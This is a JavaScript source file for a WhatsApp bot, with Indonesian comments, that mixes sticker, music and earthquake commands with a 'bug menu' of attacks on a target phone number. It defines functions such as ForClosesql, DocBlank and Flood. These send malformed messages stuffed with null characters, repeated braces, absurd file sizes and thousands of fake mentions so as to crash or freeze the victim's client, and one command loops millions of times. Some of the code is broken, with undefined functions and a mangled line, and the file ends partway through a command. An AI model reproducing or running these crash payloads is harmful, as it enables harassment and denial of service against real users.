require('./config');
const fs = require('fs');
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const speed = require('performance-now');
const similarity = require('similarity');
const { default: 
baileys, 
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType, 
prepareWAMessageMedia } = require("@whiskeysockets/baileys");

// MODULE
module.exports = zepy = async (zepy, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? zepy.user.id.split(":")[0] || zepy.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '/';

// FUNCTION GRUB
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");
// DATABASE DAN LAIN LAIN
const botNumber = await zepy.decodeJid(zepy.user.id);
const isBot = botNumber.includes(senderNumber)
const newOwner = JSON.parse(fs.readFileSync("./library/database/moderator.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))

const isPremium = premium.includes(m.sender)
const isOwner = newOwner.includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// FUNCTION GRUB 2
const groupMetadata = isGroup ? await zepy.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
// FUNCTION SAYA
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
sleep } = require('./library/function');
// FUNCTION WAKTU
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");
const waktuRunPanel = getUptime();
// WAKTU RUN PANEL
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  
  return `${hours}h ${minutes}m ${seconds}s`;
};

// EMOJI ACAK
const Moji1 = '😹'
const Moji2 = '⚡'
const Moji3 = '🔥'
const ERandom = [Moji1, Moji2, Moji3]
let Feature = Math.floor(Math.random() * ERandom.length)
const emoji = ERandom[Feature]
// FOTO BOT
const thumb = fs.readFileSync('./media/thumb.jpg');
// FUNCTION PREFIX TIDAK DITEMUKAN
if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('case.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `▢ Hi User, Are you looking for ${prefix+mean}?\n▢ Menu name: ${prefix+mean}`
zepy.sendMessage(m.chat, { image: thumb, caption: response }, {quoted: m})
}}

// SEDIKIT TAMPILAN
const sound = { 
key: {
fromMe: false, 
participant: `18002428478@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 9999999999999,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const hw = {
  key: {
    participant: '18002428478@s.whatsapp.net', 
    ...(m.chat ? {remoteJid: `status@broadcast`} : {})
  }, 
  message: {
    liveLocationMessage: {
      caption: `Vanayyis`,
      jpegThumbnail: ""
    }
  }, 
quoted: sound
} 

const loli = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: thumb,
      itemCount: "0",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Vanayyis`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

// TEKS REPLI
const reply = (teks) => { 
zepy.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `Vanayyis`,"body": `version: 1.0`, "previewType": "PHOTO","thumbnailUrl": `https://qu.ax/rcZPF.jpg`}}}, { quoted: hw})} 

// REAKSI
const reaction = async (jidss, emoji) => {
zepy.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

// MAIN FUNC 
async function ForClosesql(target) {
    try {
        let sql = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "‼️⃟ ༚ ./☠️ VenomStrike-X¿? . ",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0000".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "galaxy_message",
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "payment_method",
                                    buttonParamsJson: JSON.stringify({})
                                }
                            ]
                        }
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
        });

        await zepy.relayMessage(target, sql.message, { messageId: sql.key.id });
        console.log(`[ForClosesql] terkirim ke ${target}`);
    } catch (err) {
        console.error("[ForClosesql] Error:", err);
    }
}

async function DocBlank(target, ptcp = true) {
  await zepy.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "Xnxx.com",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "\u0000\n" + "ꦾ".repeat(60000),
            },
            nativeFlowMessage: {
                  messageParamsJson: "{".repeat(5000),
                },
            footer: {
              text: "\u0000\n" + "ꦾ".repeat(60000),
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "Xnxx.com",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}

async function Flood(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 9999999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: { 
              text: `⍣᳟`
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(5000),
              buttons: [
                {
                  name: "payment_method",
                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(0x2710)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
                },
              ],
            },
          },
        },
      },
    };
    await zepy.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
// ----- end func 
switch (command) {
case "menu": {
const captionnya = `

 ➤  ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
❏ status: ${isOwner ? "Owner" : isPremium ? "Premium" : "No Acces"}
❏ Nama Script : *${global.botname}*
❏ Creator: *${global.namaOwner}*
❏ version: *${global.versi}*
❏ Mode : ${zepy.public? 'Public' : 'Private'}
❏ Uptime : ${WaktuRunPanel}

 ➤  ｢ User Bot  ｣
 ❏ User : ${pushname} 
 ❏ Status : Buy only Vip
> [ CREDIT ] 
> Vayyis [ ᴅᴇᴠᴇʟᴏᴘᴇʀ ] 
> Kyyz   [ sᴜᴘᴘᴏʀᴛ ] 
> wafa   [ ғʀɪᴇɴᴅ ] 

 (🌟) ᴊᴀɴɢᴀɴ ʟᴜᴘᴀ sʜᴏʟᴀᴛ 5 ᴡᴀᴋᴛᴜ ᴅᴇʀ 
`;
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "𝙇𝙄𝙎𝙏𝙈𝙀𝙉𝙐",
                    sections: [
                        {
                            title: "𝗚𝗮𝗹𝗮𝗻𝗴𝗠𝗼𝗱𝘀𝘀 𝘅 𝗙𝗶𝗸𝗫𝘇𝗫𝗺𝗼𝗱𝘇𝗧𝘇𝘆",
                            highlight_label: "𝙍𝙚𝙘𝙤𝙢𝙚𝙣𝙙𝙚𝙙",
                            rows: [
                                {
    title: "🐉 BUG MENU",
    description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴜɢ ᴍᴇɴᴜ.",
    id: `.bugmenu`
},
{
    title: "🌟 FUN MENU",
    description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғᴜɴ  .",
    id: `.fun`
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]
    
  await zepy.sendMessage(m.chat, {    
         image: { url: "https://files.catbox.moe/hl0n4a.jpg" }, 
        caption: captionnya,
        contextInfo: {
isForwarded: true,
mentionedJid: [m.sender, owner+"@s.whatsapp.net"], 
forwardedNewsletterMessageInfo: {
newsletterName: `RixzzNotDev`,
newsletterJid: ``
  }, 
   },
        footer: "vanayyis - 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: hw})

       try 
           {
        await zepy.sendMessage(m.chat, { audio: fs.readFileSync("./media/sound.mp3"), mimetype: "audio/mpeg", ptt: true }, { quoted: hw });

    } catch (error) {
        console.error("Error in 'allmenu' case:", error);
        reply("Terjadi kesalahan saat memproses perintah.");
    }
}
break;

case "bugmenu": {
const captionnya = `
➤  ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
❏ Nama Script : *${global.botname}*
❏ Mode : ${zepy.public? 'Public' : 'Private'}
❏ status: ${isOwner ? "Owner" : isPremium ? "Premium" : "No Acces"}

(🐉) ~ ᴊᴀɴɢᴀɴ ᴛᴇʀʟᴀʟᴜ ᴛᴇʀᴀɴɢ ɴᴀɴᴛɪ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ɢᴀ senang 
   
> 💠 ━⊱ [ Easy Bug ]

▢ ɪɴᴠɪs  <ᴛᴀʀɢᴇᴛ>
▢ comboblank <ᴛᴀʀɢᴇᴛ>
▢ delayhard < ᴛᴀʀɢᴇᴛ > 
▢ spam-cal  <ᴛᴀʀɢᴇᴛ>
> 💠 ━⊱ [ Hard Bug ]
ꃅ blankui < ᴛᴀʀɢᴇᴛ >
▢ crash  <ᴛᴀʀɢᴇᴛ>
▢ force < ᴛᴀʀɢᴇᴛ > 

> 🔧 ━⊱ *CONTROL BOT*
▢ ᴀᴅᴅᴏᴡɴ - ᴀᴅᴅ ᴏᴡɴ
▢ ᴅᴇʟᴏᴡɴ - ᴅᴇʟᴇᴛᴇ ᴏᴡɴ
▢ ᴀᴅᴅᴘʀᴇᴍ - ᴀᴅᴅ ᴍᴜʀɪᴅ ʙᴜɢ
▢ ᴅᴇʟᴘʀᴇᴍ - ᴅᴇʟᴇᴛᴇ ᴍᴜʀɪᴅ ʙᴜɢ
▢ ᴘᴜʙʟɪᴄ 
▢ sᴇʟғ
`
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "𝙇𝙄𝙎𝙏𝙈𝙀𝙉𝙐",
                    sections: [
                        {
                            title: "©rixzzNotDev",
                            highlight_label: "𝙍𝙚𝙘𝙤𝙢𝙚𝙣𝙙𝙚𝙙",
                            rows: [
                                {
    title: "🐉 BUG MENU",
    description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴜɢ ᴍᴇɴᴜ.",
    id: `.bugmenu`
},
{
  
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]
    
  await zepy.sendMessage(m.chat, {    
         image: { url: "https://files.catbox.moe/hl0n4a.jpg" }, 
        caption: captionnya,
        contextInfo: {
isForwarded: true,
mentionedJid: [m.sender, owner+"@s.whatsapp.net"], 
forwardedNewsletterMessageInfo: {
newsletterName: `RixzzNotDev`,
newsletterJid: ``
  }, 
   },
        footer: "vanayyis - 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: hw})
     
       try 
           {
        await zepy.sendMessage(m.chat, { audio: fs.readFileSync("./media/sound.mp3"), mimetype: "audio/mpeg", ptt: true }, { quoted: hw });

    } catch (error) {
        console.error("Error in 'allmenu' case:", error);
        reply("Terjadi kesalahan saat memproses perintah.");
    }
}
break;

case "fun": {
const captionnya = `
➤  ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
❏ Nama Script : *${global.botname}*
❏ Mode : ${zepy.public? 'Public' : 'Private'}
❏ status: ${isOwner ? "Owner" : isPremium ? "Premium" : "No Acces"}

❏ iqc 
❏ brat
❏ infogempa
❏ spotify
❏ play
❏ ngl
❏ rvo
`
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "𝙇𝙄𝙎𝙏𝙈𝙀𝙉𝙐",
                    sections: [
                        {
                            title: "©rixzzNotDev",
                            highlight_label: "𝙍𝙚𝙘𝙤𝙢𝙚𝙣𝙙𝙚𝙙",
                            rows: [
                                {
    title: "🐉 BUG MENU",
    description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴜɢ ᴍᴇɴᴜ.",
    id: `.bugmenu`
},

                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]
    
  await zepy.sendMessage(m.chat, {    
         image: { url: "https://files.catbox.moe/hl0n4a.jpg" }, 
        caption: captionnya,
        contextInfo: {
isForwarded: true,
mentionedJid: [m.sender, owner+"@s.whatsapp.net"], 
forwardedNewsletterMessageInfo: {
newsletterName: `RixzzNotDev`,
newsletterJid: ``
  }, 
   },
        footer: "vanayyis - 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: hw})
     
       try 
           {
        await zepy.sendMessage(m.chat, { audio: fs.readFileSync("./media/sound.mp3"), mimetype: "audio/mpeg", ptt: true }, { quoted: hw });

    } catch (error) {
        console.error("Error in 'allmenu' case:", error);
        reply("Terjadi kesalahan saat memproses perintah.");
    }
}
break;

// CASE FUN + MAIN SORO" 
case "brat": {
  if (!text) {
    return m.reply(`*\`ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ\`*:\n${prefix + command} halo suki`);
  }

  try {
    await zepy.sendMessage(m.chat, {
      react: { text: "⏳", key: m.key }
    });

    const url = `https://api.nekorinn.my.id/maker/brat-v2?text=${encodeURIComponent(text)}`;
    const res = await fetch(url);
    if (!res.ok) throw new Error("Gagal mengambil data dari API.");

    const buffer = await res.buffer();

    await zepy.sendImageAsSticker(m.chat, buffer, m, {
      packname: "Brat Generated",
      author: ""
    });
  } catch (err) {
    console.error("Error:", err);
    await zepy.sendMessage(m.chat, {
      text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti."
    }, { quoted: hw });
  }
}
db.data.users[m.sender].exp += await randomNomor(60)
break;

case 'iqc': {
    if (!q) return reply(`*Masukkan teks!*\nContoh: .iqc kyy`)

    let url = `https://flowfalcon.dpdns.org/imagecreator/iqc?text=${encodeURIComponent(q)}`
    try {
        await zepy.sendMessage(m.chat, {
            image: { url },
            caption: `✅ *Berhasil!*\nTeks: ${q}`
        }, { quoted: hw })
    } catch (e) {
        console.error(e)
        reply('❌ Gagal mengambil gambar dari API.')
    }
}
db.data.users[m.sender].exp += await randomNomor(60)
break

case 'infogempa': {
    if (!isRegistered) return daftar('*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur')

    const { default: axios } = require('axios')

    try {
        const response = await axios.get('https://earthquake.usgs.gov/earthquakes/feed/v1.0/summary/1.0_day.geojson')
        const features = response.data.features

        if (!features || features.length === 0) return reply('Tidak Ada Data Gempa Terkini')

        // Ambil data gempa terbaru
        const gempaTerkini = features[0]
        const waktu = new Date(gempaTerkini.properties.time).toLocaleString()
        const lokasi = gempaTerkini.properties.place
        const magnitudo = gempaTerkini.properties.mag
        const kedalaman = gempaTerkini.properties.depth
        const koordinat = gempaTerkini.geometry.coordinates.slice(0, 2).join(', ')
        const dirasakan = gempaTerkini.properties.dop || 'Tidak Terdata'

        const teks = `*Info Gempa Terkini (USGS)*\n\n` +
        `• Waktu     : ${waktu}\n` +
        `• Lokasi    : ${lokasi}\n` +
        `• Magnitudo : ${magnitudo}\n` +
        `• Kedalaman : ${kedalaman} km\n` +
        `• Koordinat : ${koordinat}\n` +
        `• Dirasakan : ${dirasakan}`

        // Kirim pesan dengan informasi gempa
        await zepy.sendMessage(m.chat, {
            text: teks
        }, { quoted: hw })
    } catch (e) {
        reply('Gagal Mengambil Data Gempa: ' + e.message)
    }
}
db.data.users[m.sender].exp += await randomNomor(60)
break

case 'spotify':
case 'play': {
  if (!text) {
    return m.reply(`Contoh: ${prefix} bonc cikadap👏`)
  }
  try {
    zepy.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
    const yts = require('yt-search')
const nyoba = await yts(text);
const { url, title, description, thumbnail, duration, ago, views, author } = nyoba.all[0];
    const body = `• Judul: ${title}\n` +
      `• Channel: ${author.name}\n` +
      `• Durasi: ${duration}\n` +
      `• Link: ${url}\n\nKlik *Video* tuk vidio\nKlik *Audio* tuk audio`
    const buttons = [
      {
        buttonId: `${prefix}ytmp4 ${url}`,
        buttonText: { displayText: 'Video' },
        type: 1
      },
      {
        buttonId: `${prefix}ytmp3 ${url}`,
        buttonText: { displayText: 'Audio' },
        type: 1
      }
    ]
    await zepy.sendMessage(m.chat, {
      image: { url: thumbnail },
      caption: body,
      footer: null,
      buttons: buttons,
      headerType: 1,
      viewOnce: true
    }, { quoted: m })
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan: '+err)
  }
}
db.data.users[m.sender].exp += await randomNomor(60)
break

case 'myip': {
  let res = await fetch('https://www.velyn.biz.id/api/tools/myip')
  let json = await res.json()
  if (!json.success) return m.reply('Gagal mengambil data IP!')

  let { ip, type, city, region, country, isp, timezone, flag } = json
  let teks = `*MY IP INFO*\n\n`
  teks += `🌐 IP: ${ip}\n`
  teks += `📡 Tipe: ${type}\n`
  teks += `🏙️ Kota: ${city}\n`
  teks += `🌍 Wilayah: ${region}, ${country} ${flag.emoji}\n`
  teks += `🏢 ISP: ${json.connection.org} (${isp})\n`
  teks += `🕐 Zona Waktu: ${timezone.id} (UTC${timezone.utc})\n`
  teks += `🗺️ Lokasi: ${json.latitude}, ${json.longitude}\n`

  zepy.sendMessage(m.chat, {
    image: { url: flag.img },
    caption: teks
  }, { quoted: hw })
}
db.data.users[m.sender].exp += await randomNomor(60)
break

case 'ngl': {
  if (!text) return reply('Masukkan isi pesan anonim!\nContoh: .ngl Aku suka kamu.')
  
  try {
    const encodedTitle = encodeURIComponent('Kirimi aku pesan anonim!')
    const encodedText = encodeURIComponent(text.trim())
    const imageUrl = `https://flowfalcon.dpdns.org/imagecreator/ngl?title=${encodedTitle}&text=${encodedText}`

    const ownerJids = global.owner.map(o => typeof o === 'object' ? `${o[0]}@s.whatsapp.net` : `${o}@s.whatsapp.net`)

    for (const jid of ownerJids) {
      await conn.sendMessage(jid, {
        image: { url: imageUrl },
        caption: '📩 Kamu menerima pesan anonim.'
      })
    }

    reply('✅ Pesan anonim kamu sudah dikirim ke owner.')

  } catch (e) {
    console.error(e)
    reply('Gagal mengirim pesan anonim Ini Terjadi Karna\n-Pesan Tidak Bersifat Anonim\n-18+\n-kasar/jorok.')
  }
}
db.data.users[m.sender].exp += await randomNomor(60)
break

case "rvo": {
    if (!m.quoted) return reply(
        `bukan begitu gini tau!${prefix + command}`);
    try {
        let buffer = await m.quoted.download();
        let type = m.quoted.mtype;
        let sendOptions = { quoted: m };
        let caption = "Done Nih Hasil Rvo Ny";

        if (type === "videoMessage") {
            await zepy.sendMessage(m.chat, { video: buffer, caption }, sendOptions);
        } else if (type === "imageMessage") {
            await zepy.sendMessage(m.chat, { image: buffer, caption }, sendOptions);
        } else if (type === "audioMessage") {
            await zepy.sendMessage(m.chat, {
                audio: buffer,
                mimetype: "audio/mpeg",
                ptt: m.quoted.ptt || false
            }, sendOptions);
        } else {
            return reply("❌ Media View Once tidak didukung.");
        }
    } catch (err) {
        console.error(err);
    }

    db.data.users[m.sender].exp += await randomNomor(60);
}
break;

case "addown":{
if (!isBot && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!args[0]) return reply(`ⓘ Example: ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await zepy.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`ⓘ Invalid Number`)
newOwner.push(prrkek)
fs.writeFileSync("./library/database/moderator.json", JSON.stringify(newOwner))
reply(`ⓘ ${prrkek} Added To Owner Acces`)
}
break

case "delown":{
if (!isBot && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!args[0]) return reply(`ⓘ Example: ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = newOwner.indexOf(ya)
newOwner.splice(unp, 1)
fs.writeFileSync("./library/database/moderator.json", JSON.stringify(newOwner))
reply(`ⓘ ${ya} Removed From Owner Acces`)
}    
break

case "addprem":{
if (!isBot && !isOwner) return reply("ⓘ You Don't Have Access")
if (!args[0]) return reply(`ⓘ Example: ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await zepy.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`ⓘ Invalid Number`)
premium.push(prrkek)
fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium))
reply(`ⓘ ${prrkek} Added To Premium Acces`)
}
break

case "delprem":{
if (!isBot && !isOwner) return reply("ⓘ You Don't Have Access")
if (!args[0]) return reply(`ⓘ Example: ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium))
reply(`ⓘ ${ya} Removed From Premium Acces`)
}
break

case "self":
case "public": {
  if (!isBot) return m.reply("❌ Akses ditolak! Perintah ini hanya untuk developer.");
  const mode = command === "public";
  zepy.public = mode;
  return m.reply(`✅ Bot berhasil beralih ke mode *${mode ? "public" : "self"}*.`);
}
break 
// VASIONGLX BUG CASE
case 'invis': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
reply(`> 🦠 ━⊱ *INFORMATION* 
▢ target: ${pepec}
▢ status: success
▢ type: ${command}`)
// Memulai Crashing
for (let i = 0; i <= 9999991; i++) {
    await albumdelay(target);
    await albumdelay(target);
    }
zepy.sendMessage(from, {react: {text: "💠", key: m.key}})
}
break
// BREAK SYS CASE
case 'crash': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
reply(`> 🦠 ━⊱ *INFORMATION* 
▢ target: ${pepec}
▢ status: success
▢ type: ${command}`)
// Memulai CCrashingawait infinitiesdelay(target);
    await ForClosesql(target);
